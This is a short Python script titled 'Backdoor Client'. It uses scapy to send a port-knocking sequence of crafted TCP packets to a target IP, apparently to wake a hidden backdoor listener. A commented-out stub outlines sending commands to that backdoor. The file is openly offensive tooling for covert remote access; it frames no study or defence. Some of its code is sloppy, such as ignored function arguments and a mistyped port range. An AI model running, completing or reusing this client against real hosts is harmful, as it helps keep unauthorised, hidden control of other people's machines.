#!/usr/bin/python

import sys
import os
import argparse
import base64
import shlex
import socket
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

parser = argparse.ArgumentParser(description='Backdoor Client')
parser.add_argument('-d', '--destination', dest='destIp', help='destination IP Address')
parser.add_argument('-p', '--ports', dest='ports', help='port sequence', nargs='+', type=str, required=True)
parser.add_argument('-c', '--command', dest='cmd', help='command to send', type=str)
args = parser.parse_args()


def knock(host, ports):
	host = args.destIp
	ports = []
	for port in args.ports:
		ports.append(port)
	for i in ports:
		pkt = IP(dst=host)/TCP(sport=int(i), dport=RandNum(0,65355), window=4096)
		send(pkt)

def main():
	knock(args.destIp, args.ports)

main()
# def sendCommand(ipAddr):
# 	data = shlex.split(args.cmd) #do this on sever
# 	pkt = IP(dst=ipAddr)/TCP(sport=RandNum(0, 65335), dport=RandNum(0, 65355))/data
